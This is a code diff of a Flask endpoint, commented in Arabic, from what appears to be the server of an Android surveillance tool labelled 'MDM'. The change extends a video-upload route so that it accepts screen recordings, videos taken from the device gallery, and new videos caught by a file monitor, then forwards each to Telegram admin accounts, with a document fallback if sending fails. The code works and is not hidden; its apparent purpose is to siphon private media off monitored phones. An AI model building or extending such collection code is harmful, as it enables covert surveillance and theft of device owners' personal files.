@@ -3236,48 +3236,123 @@ def _sock_file_explorer(data):
             logger.error(f"فشل إرسال نتائج file explorer: {e}")
 
 
-# ⚡ REST endpoint for video upload (تسجيل فيديو الشاشة)
+# ⚡ REST endpoint for video upload (تسجيل فيديو الشاشة + معرض الفيديوهات + FileMonitor)
 @app.route("/api/device/video-upload", methods=["POST"])
 def _api_video_upload():
-    """Receive uploaded screen record video (MP4) and send to Telegram."""
+    """Receive uploaded video (MP4) and send to Telegram.
+
+    ⚡ V11.2.43: يدعم ثلاثة مصادر:
+      - type=screen_record     → تسجيل شاشة
+      - type=gallery_video     → فيديو من المعرض
+      - type=file_monitor_video → فيديو جديد من FileObserver
+
+    الحد الأقصى: 50MB (مضمّن في MAX_CONTENT_LENGTH=100MB)
+    """
     try:
-        did = request.form.get("device_id", "")
-        vid_type = request.form.get("type", "screen_record")
+        did = request.form.get("device_id", "") or request.headers.get("device_id", "")
+        vid_type = request.form.get("type", "screen_record") or request.headers.get("type", "screen_record")
         video_file = request.files.get("file")
+        file_name = request.form.get("name", "")
+        index = request.form.get("index", "0")
+        total = request.form.get("total", "0")
+        duration_ms = request.form.get("duration_ms", "0")
 
         if not did or not video_file:
             return jsonify({"error": "missing device_id or file"}), 400
 
         dev = dm.get_device(did)
         if not dev:
+            logger.warning(f"⚠️ Video upload from unknown device: {did}")
             return jsonify({"error": "unknown device"}), 404
 
-        logger.info(f"📹 Video upload from #{dev.get('short_id', '?')}: "
-                     f"type={vid_type} size={video_file.content_length}")
+        # احفظ الملف مؤقتاً (لأن streaming مباشر من request.files قد يفشل مع send_video)
+        import tempfile, os
+        tmp_path = None
+        try:
+            # احفظ الملف على disk
+            suffix = os.path.splitext(file_name or "video.mp4")[1] or ".mp4"
+            tmp_fd, tmp_path = tempfile.mkstemp(suffix=suffix, prefix="vid_upload_")
+            video_file.save(tmp_path)
+            file_size = os.path.getsize(tmp_path)
+            os.close(tmp_fd)
 
-        # إرسال الفيديو للبوت عبر Telegram
-        if mdm_bot:
-            short_label = _dev_label(dev)
-            from datetime import datetime as _dt
-            now_str = _dt.now().strftime("%H:%M:%S")
+            logger.info(f"📹 Video upload from #{dev.get('short_id', '?')}: "
+                        f"type={vid_type} name={file_name} size={file_size} bytes")
 
-            for admin_id in Config.ADMIN_IDS:
+            if file_size < 100:
+                logger.warning(f"⚠️ Video too small: {file_size} bytes")
+                return jsonify({"error": "file too small"}), 400
+
+            # إرسال الفيديو للبوت عبر Telegram
+            if mdm_bot:
+                short_label = _dev_label(dev)
+                from datetime import datetime as _dt
+                now_str = _dt.now().strftime("%H:%M:%S")
+                file_size_mb = file_size / 1024 / 1024
+
+                # ⚡ caption مخصص حسب النوع
+                if vid_type == "gallery_video":
+                    idx_str = f" ({index}/{total}) " if total and total != "0" else " "
+                    caption = (f"🎬 <b>فيديو من المعرض</b>{idx_str}\n"
+                              f"📱 <b>{short_label}</b>\n"
+                              f"🕐 {now_str}\n"
+                              f"📏 {file_size_mb:.2f} MB")
+                elif vid_type == "file_monitor_video":
+                    caption = (f"📂 <b>فيديو جديد</b>\n"
+                              f"📱 <b>{short_label}</b>\n"
+                              f"🕐 {now_str}\n"
+                              f"📏 {file_size_mb:.2f} MB\n"
+                              f"📁 {file_name}")
+                else:
+                    caption = (f"📹 <b>تسجيل شاشة</b>\n"
+                              f"📱 <b>{short_label}</b>\n"
+                              f"🕐 {now_str}\n"
+                              f"📏 {file_size_mb:.2f} MB")
+
+                if file_name:
+                    caption += f"\n📁 {file_name}"
+
+                # truncate caption to 1024 chars (Telegram limit)
+                if len(caption) > 1024:
+                    caption = caption[:1020] + "..."
+
+                for admin_id in Config.ADMIN_IDS:
+                    try:
+                        with open(tmp_path, "rb") as vf:
+                            mdm_bot.bot.send_video(
+                                admin_id,
+                                video=vf,
+                                caption=caption,
+                                parse_mode="HTML",
+                                timeout=300,  # 5 دقائق للملفات الكبيرة
+                                filename=file_name or f"video_{dev.get('short_id', 'x')}.mp4"
+                            )
+                        logger.info(f"✅ Video sent to admin {admin_id} ({file_size_mb:.2f} MB)")
+                    except Exception as e:
+                        logger.error(f"❌ Failed to send video to admin {admin_id}: {e}")
+                        # ⚡ fallback: أرسل كـ document لو send_video فشل
+                        try:
+                            with open(tmp_path, "rb") as vf:
+                                mdm_bot.bot.send_document(
+                                    admin_id,
+                                    document=vf,
+                                    caption=caption,
+                                    parse_mode="HTML",
+                                    timeout=300,
+                                    filename=file_name or f"video_{dev.get('short_id', 'x')}.mp4"
+                                )
+                            logger.info(f"✅ Fallback: video sent as document to admin {admin_id}")
+                        except Exception as e2:
+                            logger.error(f"❌ Document fallback failed for admin {admin_id}: {e2}")
+        finally:
+            # احذف الملف المؤقت
+            if tmp_path and os.path.exists(tmp_path):
                 try:
-                    mdm_bot.bot.send_video(
-                        admin_id,
-                        video=video_file,
-                        caption=f"📹 <b>تسجيل شاشة</b>\n"
-                                f"📱 <b>{short_label}</b>\n"
-                                f"🕐 {now_str}\n"
-                                f"📏 {video_file.content_length // 1024} KB",
-                        parse_mode="HTML",
-                        timeout=120
-                    )
-                    logger.info(f"✅ Video sent to admin {admin_id}")
-                except Exception as e:
-                    logger.error(f"❌ Failed to send video to admin {admin_id}: {e}")
+                    os.remove(tmp_path)
+                except Exception:
+                    pass
 
-        return jsonify({"success": True}), 200
+        return jsonify({"success": True, "size": file_size, "type": vid_type}), 200
     except Exception as e:
         logger.error(f"❌ video-upload error: {e}", exc_info=True)
         return jsonify({"error": str(e)}), 500
